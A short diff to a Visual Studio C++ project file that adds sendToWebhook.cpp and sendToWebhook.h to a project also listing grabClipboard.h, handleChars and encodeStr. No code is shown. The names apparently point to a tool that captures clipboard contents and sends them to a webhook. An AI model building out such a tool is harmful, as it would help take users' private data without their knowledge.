@@ -132,6 +132,7 @@
     <ClCompile Include="encodeStr.cpp" />
     <ClCompile Include="handleChars.cpp" />
     <ClCompile Include="main.cpp" />
+    <ClCompile Include="sendToWebhook.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="advStr.h" />
@@ -139,6 +140,7 @@
     <ClInclude Include="grabClipboard.h" />
     <ClInclude Include="handleChars.h" />
     <ClInclude Include="includes.h" />
+    <ClInclude Include="sendToWebhook.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
